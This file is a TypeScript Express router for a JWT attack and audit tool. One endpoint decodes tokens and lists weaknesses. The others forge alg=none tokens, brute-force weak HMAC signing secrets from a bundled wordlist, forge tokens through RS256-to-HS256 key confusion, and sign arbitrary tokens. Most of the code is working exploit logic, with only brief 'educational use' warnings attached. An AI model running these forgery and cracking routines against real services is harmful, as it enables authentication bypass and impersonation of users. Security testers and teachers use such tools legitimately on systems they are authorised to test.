import { Router } from "express";
import * as crypto from "crypto";

const router = Router();

function base64UrlDecode(str: string): string {
  const padded = str.replace(/-/g, "+").replace(/_/g, "/").padEnd(str.length + ((4 - (str.length % 4)) % 4), "=");
  try { return Buffer.from(padded, "base64").toString("utf8"); }
  catch { return ""; }
}

function decodeJwt(token: string) {
  const parts = token.trim().split(".");
  if (parts.length < 2) throw new Error("Not a valid JWT (need at least 2 parts)");
  const header  = JSON.parse(base64UrlDecode(parts[0]));
  const payload = JSON.parse(base64UrlDecode(parts[1]));
  return { header, payload, signature: parts[2] || "", parts };
}

// Weak secrets wordlist for HS* brute-force
const COMMON_SECRETS = [
  "secret", "password", "123456", "changeme", "jwt_secret",
  "supersecret", "mysecret", "test", "key", "abc123",
  "qwerty", "admin", "letmein", "welcome", "pass123",
  "secret123", "jwtkey", "signing_key", "app_secret", "token_secret",
  "your-256-bit-secret", "your-512-bit-secret", "my_secret_key",
  "HS256", "HS512", "development", "dev_secret", "prod_secret",
];

function hmacSign(data: string, secret: string, alg: string): string {
  const hashAlg = alg === "HS256" ? "sha256" : alg === "HS384" ? "sha384" : "sha512";
  return crypto.createHmac(hashAlg, secret).update(data).digest("base64url");
}

// Decode
router.post("/decode", (req, res) => {
  const { token } = req.body as { token?: string };
  if (!token) return res.status(400).json({ error: "token required" });
  try {
    const { header, payload, signature, parts } = decodeJwt(token);
    const now = Math.floor(Date.now() / 1000);
    const issues: { severity: string; title: string; detail: string }[] = [];

    // Check alg
    if (!header.alg || header.alg === "none") {
      issues.push({ severity: "CRITICAL", title: "Algorithm: none", detail: "Token uses no signature — trivially forgeable." });
    }
    if (["HS256", "HS384", "HS512"].includes(header.alg)) {
      issues.push({ severity: "MEDIUM", title: "Symmetric HMAC algorithm", detail: "If secret is weak, token can be cracked offline." });
    }

    // Expiry
    if (!payload.exp) {
      issues.push({ severity: "HIGH", title: "No expiration (exp)", detail: "Token never expires — valid indefinitely." });
    } else if (payload.exp < now) {
      issues.push({ severity: "MEDIUM", title: "Token expired", detail: `Expired ${new Date(payload.exp * 1000).toISOString()}` });
    }

    // No issued-at
    if (!payload.iat) {
      issues.push({ severity: "LOW", title: "No issued-at (iat)", detail: "Cannot determine token age." });
    }

    // No audience
    if (!payload.aud) {
      issues.push({ severity: "LOW", title: "No audience (aud)", detail: "Audience not restricted — may be accepted by unintended services." });
    }

    res.json({
      header, payload, signature,
      raw: { header: parts[0], payload: parts[1], signature: parts[2] },
      issues,
      isExpired: payload.exp ? payload.exp < now : false,
      expiresAt: payload.exp ? new Date(payload.exp * 1000).toISOString() : null,
      issuedAt: payload.iat ? new Date(payload.iat * 1000).toISOString() : null,
    });
  } catch (e: any) {
    res.status(400).json({ error: e.message });
  }
});

// alg=none attack
router.post("/alg-none", (req, res) => {
  const { token } = req.body as { token?: string };
  if (!token) return res.status(400).json({ error: "token required" });
  try {
    const { header, payload } = decodeJwt(token);
    header.alg = "none";
    const newHeader  = Buffer.from(JSON.stringify(header)).toString("base64url");
    const newPayload = Buffer.from(JSON.stringify(payload)).toString("base64url");
    const forged = `${newHeader}.${newPayload}.`;
    res.json({
      forgedToken: forged,
      description: "Signature stripped and alg set to 'none'. If the server accepts this, it does not validate signatures.",
      warning: "Educational use only — test only on systems you own or have explicit permission to test.",
    });
  } catch (e: any) {
    res.status(400).json({ error: e.message });
  }
});

// HMAC secret brute-force
router.post("/crack", (req, res) => {
  const { token, customSecrets } = req.body as { token?: string; customSecrets?: string[] };
  if (!token) return res.status(400).json({ error: "token required" });
  try {
    const { header, parts } = decodeJwt(token);
    if (!["HS256", "HS384", "HS512"].includes(header.alg)) {
      return res.json({ cracked: false, secret: null, message: `Algorithm ${header.alg} is not HMAC — cannot brute-force with this method.` });
    }
    const data = `${parts[0]}.${parts[1]}`;
    const wordlist = [...COMMON_SECRETS, ...(customSecrets || [])];

    for (const secret of wordlist) {
      const sig = hmacSign(data, secret, header.alg);
      if (sig === parts[2]) {
        return res.json({ cracked: true, secret, algorithm: header.alg, message: `Secret found: "${secret}" — this token uses a weak, guessable secret.` });
      }
    }
    res.json({ cracked: false, secret: null, message: `Not found in ${wordlist.length}-word wordlist. Secret may be strong or require a larger dictionary.` });
  } catch (e: any) {
    res.status(400).json({ error: e.message });
  }
});

// RS256→HS256 key confusion attack (educational — just shows the forged structure)
router.post("/key-confusion", (req, res) => {
  const { token, publicKey } = req.body as { token?: string; publicKey?: string };
  if (!token || !publicKey) return res.status(400).json({ error: "token and publicKey required" });
  try {
    const { header, payload } = decodeJwt(token);
    const newHeader = { ...header, alg: "HS256" };
    const h = Buffer.from(JSON.stringify(newHeader)).toString("base64url");
    const p = Buffer.from(JSON.stringify(payload)).toString("base64url");
    const data = `${h}.${p}`;
    const sig = crypto.createHmac("sha256", publicKey).update(data).digest("base64url");
    const forgedToken = `${data}.${sig}`;
    res.json({
      forgedToken,
      originalAlg: header.alg,
      newAlg: "HS256",
      description: "Key confusion: HS256 signature computed using the RS256 public key as HMAC secret. If the server accepts RS256 or HS256 for the same key, this may bypass verification.",
      warning: "Educational use only.",
    });
  } catch (e: any) {
    res.status(400).json({ error: e.message });
  }
});

// Sign a new token
router.post("/sign", (req, res) => {
  const { payload, secret, alg } = req.body as { payload?: object; secret?: string; alg?: string };
  if (!payload || !secret) return res.status(400).json({ error: "payload and secret required" });
  const algorithm = alg || "HS256";
  if (!["HS256", "HS384", "HS512"].includes(algorithm)) {
    return res.status(400).json({ error: "Supported: HS256, HS384, HS512" });
  }
  try {
    const header  = Buffer.from(JSON.stringify({ alg: algorithm, typ: "JWT" })).toString("base64url");
    const pl = Buffer.from(JSON.stringify(payload)).toString("base64url");
    const data = `${header}.${pl}`;
    const sig  = hmacSign(data, secret, algorithm);
    res.json({ token: `${data}.${sig}`, algorithm });
  } catch (e: any) {
    res.status(400).json({ error: e.message });
  }
});

export default router;
